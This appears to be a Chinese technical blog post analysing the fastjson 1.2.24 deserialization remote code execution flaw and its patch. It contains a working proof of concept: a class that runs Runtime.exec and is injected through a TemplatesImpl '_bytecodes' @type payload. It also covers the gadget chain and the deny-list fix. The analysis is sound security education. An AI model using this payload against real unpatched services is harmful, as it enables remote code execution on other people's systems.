---
layout: post
title: fastjson远程代码执行漏洞问题分析
category: tech
tags: [fastjson,反序列化,漏洞,攻击]
---

* content
{:toc}


## 背景

fastjson远程代码执行安全漏洞(以下简称RCE漏洞)，最早是官方在2017年3月份发出的声明，

[security_update_20170315](https://github.com/alibaba/fastjson/wiki/security_update_20170315)

没错，强如阿里这样的公司也会有漏洞。代码是人写的，有漏洞是难免的。关键是及时的修复。

![](http://pony-maggie.github.io/assets/images/2020/java/03/3-0.jpg)


声明中，官方指出：
>最近发现fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，为了保证系统安全，请升级到1.2.28/1.2.29/1.2.30/1.2.31或者更新版本。

你会注意到这份声明中并没有对漏洞的细节有详细的描述，原因是官方担心透漏了细节会扩散漏洞。这个是可以理解的，警方公布案件的消息一般都不会透露犯罪细节，就是防止有人模仿犯罪。

公布漏洞之后，阿里进行了升级修复，并给出了防漏洞的建议。然后针对这一版的修复方案，黑客或者安全测试人又找到绕过防御的方案。于是在很长一段时间里，阿里的大佬们不断的修复漏洞，优化升级，黑客们不断的尝试新的攻击方法。整个就是一部`fastjson RCE漏洞`版的谍战剧。

![](http://pony-maggie.github.io/assets/images/2020/java/03/3-1.jpg)

由于篇幅限制，本文并不打算详细介绍`Fastjson RCE漏洞`的进化史，而是只关注第一次漏洞分析。

## 漏洞分析

为了能重现漏洞，本文示例代码都是基于`fastjson 1.2.23`版本。

如果你是maven的工程，可以直接引入下面这个依赖。
```
<dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.23</version>
        </dependency>
```


### fastjson基本使用
为了照顾有读者可能没有使用过fastjson，我们先来看看fastjson的基本用法。

首先我们定义一个实体类，
```
public class Student {
    private String name;//姓名
    private String number;//学号
    private int age;  //年龄
    private String secret;

    public String getName() {
        System.out.println("getName");
        return name;
    }
    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }
    public String getNumber() {
        System.out.println("getNumber");
        return number;
    }
    public void setNumber(String number) {
        System.out.println("setNumber");
        this.number = number;
    }
    public int getAge() {
        System.out.println("getAge");
        return age;
    }
    public void setAge(int age) {
        System.out.println("setAge");
        this.age = age;
    }
    public String getSecret() {
        System.out.println("getSecret");
        return secret;
    }
    public void setSecret(String secret) {
        System.out.println("setSecret");
        this.secret = secret;
    }
}
```
为了便于分析问题，我在gettter和setter方法中都加了打印日志。

然后我们看使用的示例，

```
public static void main(String[] args) {
        //序列化
        Student student = new Student();
        student.setName("lucas");
        student.setAge(25);
        student.setNumber("001");
        String jsonStr1 = JSON.toJSONString(student);
        String jsonStr2 = JSON.toJSONString(student, SerializerFeature.WriteClassName);
        System.out.println("jsonStr1:" + jsonStr1);
        System.out.println("jsonStr2" + jsonStr2);

        //反序列化j
        JSONObject jsonObject = JSON.parseObject(jsonStr1);
        System.out.println(jsonObject.get("name"));
        System.out.println(jsonObject.get("age"));
        System.out.println(jsonObject.get("number"));

    }
```


运行输出结果是，

```
jsonStr1:{"age":25,"name":"lucas","number":"001"}
jsonStr2{"@type":"com.app.fastjson.Student","age":25,"name":"lucas","number":"001"}
lucas
25
001
```
我们把上面的代码改下，使用`jsonStr2`进行反序列化的，
```
JSONObject jsonObject = JSON.parseObject(jsonStr2);
```

此时输出的结果是，
```
...
jsonStr2{"@type":"com.app.fastjson.Student","age":25,"name":"lucas","number":"001"}
setAge
setName
setNumber
getAge
getName
getNumber
getSecret
lucas
25
001
```

序列化的结果一个带了类信息(使用`SerializerFeature.WriteClassName`可以输出类信息)，一个没有带。这两个字符串都可以进行反序列成JsonObject对象，但是你应该已经注意到了，使用前者序列化的时候，调用了类对象的getter和setter方法。

**因为fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数。**

请你记住这个结论，因为它正是漏洞的关键所在。

### 攻击
既然反序列化的时候会执行getter和setter方法，那我们是不是可以在这些方法里加入攻击的代码，然后
fastjson返序列化的时候调用，不就达到了攻击的目的了吗。

我们先来构造一次攻击，等下再解释原理。

首先构造一段恶意代码，很简单就是在构造函数里打开本地的一个计算器应用。
```
public class EvilCode extends AbstractTranslet {

    public EvilCode() throws IOException {
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) throws IOException {
        EvilCode evilCode = new EvilCode();
    }
}
```
运行的效果如下图所示，

![](http://pony-maggie.github.io/assets/images/2020/java/03/3-2.png)

我们把编译好的`EvilCode.class`文件留着备用。接着我们写一段`poc`证明漏洞的存在，

```
public class Pocf {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void  test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        //根据自己的实际路径修改
        final String evilClassPath = System.getProperty("user.dir") + "//target//classes//com//app//fastjson//EvilCode.class";
        String evilCode = readClass(evilClassPath);

        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);

        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        //assertEquals(Model.class, obj.getClass());
    }
    public static void main(String args[]){
        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

运行这段代码，你会发现计算器的引用也会弹出来。这就相当于在反序列的时候执行了我们的恶意代码。

### 攻击原理分析
我们来分析下上面那段`poc`代码，首先是读入我们的`EvilCode`class文件，这里有一个小细节就是读入的class文件内容会被base64编码。为什么要这么处理呢？

答案其实也很简单，因为FastJson提取`byte[]`数组字段值时会进行Base64解码，这个大家看下源码就知道了，不是本文的重点这里不展开了。

接下来就是执行反序列了，我们的`EvilCode`的class文件是赋值给了`TemplatesImpl`的_bytecodes属性，_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。

前面提到过，反序列化的时候会调用成员变量的getter和setter方法，这其中就包括`_outputProperties`的getter方法，
```
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

```
public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
```

```
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();
            ...
        
```

```
private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader());
                }
            });

        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new Hashtable();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }
            ...
```

不知道你看明白了没有。
>在getTransletInstance调用defineTransletClasses，在defineTransletClasses方法中会根据_bytecodes来生成一个java类，生成的java类随后会被getTransletInstance方法用到生成一个实例，也也就到了最终的执行命令的位置Runtime.getRuntime.exec()



总结起来，调用的链路是这样:

![](http://pony-maggie.github.io/assets/images/2020/java/03/3-3.png)

## 解决方案

好了，到这里你已经知道了关于漏洞的细节。那么官方是如何解决这个漏洞的呢？

Fastjson官方在1.2.24版本后默认关闭autotype功能，并且启用黑名单功能。请用户确保该功能关闭。我们简单了解下解决方案的细节。

解决方案的关键是新增了一个`checkAutoType`方法，早期版本的方法实现如下，

```
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {

        if (this.autoTypeSupport || expectClass != null) {
            for(mask = 0; mask < this.acceptList.length; ++mask) {
                accept = this.acceptList[mask];
                if (className.startsWith(accept)) {
                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
                    if (clazz != null) {
                        return clazz;
                    }

                }

            }
            for(mask = 0; mask < this.denyList.length; ++mask) {
                accept = this.denyList[mask];
                if (className.startsWith(accept) && TypeUtils.getClassFromMapping(typeName) == null) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
        }
        ...

```
这个`denyList`你可以理解成黑名单，也就是这个名单里的类都不允许反序列化。如果上面我们用来攻击的`TemplatesImpl`被加入到这个黑名单自然就不能被恶意代码攻击了。早期的黑名单如下：

```
this.denyList = "bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework".split(",");
```
后面可以不断的更新这个黑名单来抵御攻击(当然只是抵御针对黑名的攻击，其它攻击手段无法通过更新黑名单解决)。

其实机智如你应该能想到这里好像有个坑，就是黑名单公布出来，本来大家想不到的一些payload就可以被拿来攻击低版本的fastjson了。阿里应该是也意识到这个问题了，新版本的源码黑名单都是以`hashCode`的方式存放在源码里，如下所示，

```
private List<Module>                                    modules                = new ArrayList<Module>();

    {
        denyHashCodes = new long[]{
                0x80D0C70BCC2FEA02L,
                0x86FC2BF9BEAF7AEFL,
                0x87F52A1B07EA33A6L,
                0x8EADD40CB2A94443L,
                0x8F75F9FA0DF03F80L,
                0x9172A53F157930AFL,
                0x92122D710E364FB8L,
                0x92122D710E364FB8L,
                0x94305C26580F73C5L,
                0x9437792831DF7D3FL,
                0xA123A62F93178B20L,
                0xA85882CE1044C450L,
                0xAA3DAFFDB10C4937L,
                0xAFFF4C95B99A334DL,
                0xB40F341C746EC94FL,
                0xB7E8ED757F5D13A2L,
                0xBCDD9DC12766F0CEL,
                0xC00BE1DEBAF2808BL,
                0xC2664D0958ECFE4CL,
                0xC7599EBFE3E72406L,
                0xC963695082FD728EL,
                0xD1EFCDF4B3316D34L,
                0xD9C9DBF6BBD27BB1L,
                ....
```

后来黑客界，安全界的大佬们还想出其它各种攻击手段，也不断的促进者fastjson原来越好，这里不表。


不过如果你使用场景中包括了这个功能，请参考：

[enable_autotype](https://github.com/alibaba/fastjson/wiki/enable_autotype)

这里如何添加白名单或者打开autotype功能。

## 总结

fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞。

开发中应严格控制AutoType开关，保持fastjson为最新版本。保持最新的版本这个通常要注意生产上使用稳定版本而不是beta版。

---------
*参考*

* http://xxlegend.com/2017/04/29/title-%20fastjson%20远程反序列化poc的构造和分析/